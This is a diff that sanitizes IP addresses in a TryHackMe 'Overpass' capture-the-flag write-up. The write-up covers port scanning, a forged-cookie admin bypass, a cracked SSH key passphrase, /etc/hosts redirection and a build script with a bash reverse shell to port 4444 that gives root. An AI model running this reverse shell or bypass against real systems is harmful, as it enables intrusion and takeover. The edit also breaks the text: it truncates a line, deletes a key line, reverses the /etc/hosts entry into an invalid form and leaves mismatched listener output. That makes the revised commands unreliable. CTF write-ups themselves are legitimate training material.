@@ -1,8 +1,8 @@
 # TryHackMe: Overpass — Complete Writeup
 
 **Difficulty:** Easy  
-**Category:** Linux, Web Security, SSH, Privilege Escalation  
-**Target IP:** 10.114.129.64  
+**Category:** Linux, Web 
+**Target IP:** [Target-IP]  
 **Date:** 2026-05-10  
 
 ---
@@ -19,13 +19,13 @@ Overpass is a web application vulnerable to client-side authentication bypass. B
 
 **Command:**
 ```bash
-nmap -sS 10.114.129.64
+nmap -sS [Target-IP] 
 ```
 
 **Results:**
 ```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-10 15:34 -0400
-Nmap scan report for 10.114.129.64
+Nmap scan report for [Target-IP]
 Host is up (0.0245 latency).
 Not shown: 998 closed tcp ports (reset)
 
@@ -47,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2.25 seconds
 **Command:**
 ```bash
 gobuster dir \
-  -u http://10.114.129.64 \
+  -u http://[Target-IP] \
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
   -x html,js,php
 ```
@@ -112,7 +112,7 @@ Also, we really need to talk about this 'Military Grade' encryption. - Paradox"
 Cookies.set("SessionToken", "bypass");
 ```
 
-3. Navigate to `http://10.114.129.64/admin/`
+3. Navigate to `http://[Target-IP]/admin/`
 
 **Result:** ✅ Access granted to admin panel
 
@@ -138,7 +138,6 @@ JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
 WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
 BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
 AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
-3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
 ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
 VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
 OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
@@ -208,7 +207,7 @@ james13            (id_rsa)
 
 **Command:**
 ```bash
-ssh james@10.114.129.64 -i id_rsa
+ssh james@[Target-IP] -i id_rsa
 ```
 
 **When prompted for passphrase:**
@@ -218,7 +217,7 @@ Enter passphrase for key 'id_rsa': james13
 
 **Success:**
 ```
-[james@ip-10-114-129-64 ~]$
+[james@ip-[Target-IP] ~]$
 ```
 
 ✅ **User-level access obtained**
@@ -282,13 +281,13 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 **Add entry to /etc/hosts:**
 ```bash
-echo "10.114.129.64 overpass.thm" >> /etc/hosts
+echo "overpass.thm  [Local-IP]" >> /etc/hosts
 ```
 
 **Verification:**
 ```bash
 ping overpass.thm
-# PING overpass.thm (10.114.129.64)
+# PING overpass.thm ([Local-IP])
 ```
 
 ---
@@ -305,7 +304,7 @@ cd /tmp/downloads/src
 ```bash
 cat > buildscript.sh << 'EOF'
 #!/bin/bash
-bash -i >& /dev/tcp/10.114.129.64/4444 0>&1
+bash -i >& /dev/tcp/[Local-IP]/4444 0>&1
 EOF
 
 chmod +x buildscript.sh
@@ -345,7 +344,7 @@ listening on [any] 4444 ...
 
 ```bash
 # Listener output:
-connect to [10.114.129.64] from overpass-prod-01 [10.114.129.64] 12345
+connect to [Target-IP] from overpass-prod-01 [10.114.129.64] 12345
 
 # Verify root access:
 whoami
